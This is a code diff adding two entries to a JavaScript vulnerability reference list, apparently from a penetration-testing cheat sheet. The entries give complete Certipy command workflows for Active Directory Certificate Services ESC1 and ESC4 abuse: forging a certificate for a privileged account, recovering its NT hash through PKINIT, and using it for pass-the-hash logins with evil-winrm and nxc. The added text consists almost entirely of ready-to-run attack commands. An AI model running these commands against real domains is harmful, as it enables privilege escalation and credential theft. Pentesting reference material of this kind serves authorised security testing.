@@ -4654,6 +4654,26 @@ var VULNS = [
             ]
           },
           {
+            title: "ESC1 — real-world workflow (req → auth → shell)",
+            type: "commands",
+            commands: [
+              { label: "1. Request a certificate as the privileged UPN", cmd: "certipy-ad req -u <user> -p <pass> -dc-ip 10.80.40.2 -target x.bank.in -ca bank-ca -template \"websertemp\" -upn bank.admin@bank.com -dynamic-endpoint\n# certipy-ad is the Kali package's binary name for Certipy\n#   -target  CA host (FQDN)        -ca        the CA name\n#   -template  the ESC1 template   -upn       the identity to impersonate\n#   -dynamic-endpoint  resolve the CA's RPC endpoint dynamically\n# outputs bank.admin.pfx" },
+              { label: "2. Authenticate with the PFX (PKINIT → TGT + NT hash)", cmd: "certipy-ad auth -pfx bank.admin.pfx -username bankadmin -dc-ip <dc-ip> -domain bank.in\n# returns a TGT and, via UnPAC-the-hash, the account's NT hash" },
+              { label: "3. Use the recovered NT hash (pass-the-hash)", cmd: "evil-winrm -i <target-ip> -u bankadmin -H <NT-hash>" }
+            ]
+          },
+          {
+            title: "ESC4 — real-world workflow (reconfigure → exploit → restore)",
+            type: "commands",
+            commands: [
+              { label: "1. Abuse write access — make the template ESC1-vulnerable (keep a backup)", cmd: "certipy-ad template -u <user> -p <pass> -dc-ip <dc-ip> -template Machine -write-default-configuration -save-configuration Machine.json\n#   -write-default-configuration  apply Certipy's ESC1 config (grants enrol to\n#     Authenticated Users / S-1-5-11 by default)\n#   -save-configuration Machine.json  back up the ORIGINAL config so you can restore it" },
+              { label: "2. Request a cert as the target, embedding its UPN and SID", cmd: "certipy-ad req -u <user> -p <pass> -dc-ip <dc-ip> -target x.bank.in -ca bank-ca -template \"Machine\" -upn user2.admin@bank.com -sid <S-1-5-21-...-RID>\n#   -sid  embed the target's objectSid — required for strong certificate mapping\n#         since the May 2022 patches (KB5014754). outputs user2.admin.pfx" },
+              { label: "3. Authenticate with the PFX (PKINIT → NT hash)", cmd: "certipy-ad auth -pfx user2.admin.pfx -username user2admin -dc-ip <dc-ip> -domain bank.in" },
+              { label: "4. Restore the template to its original configuration (clean up ASAP)", cmd: "certipy-ad template -u <user> -p <pass> -dc-ip <dc-ip> -template Machine -write-configuration Machine.json -no-save\n#   -write-configuration Machine.json  restore the original settings from the backup\n#   -no-save  skip backing up the vulnerable state. Do this the moment you hold the cert." },
+              { label: "5. Use the recovered NT hash", cmd: "nxc smb bank.in -u user2admin -H <NT-hash>" }
+            ]
+          },
+          {
             title: "Key ESC Classes",
             type: "table",
             columns: ["ESC", "Misconfiguration"],
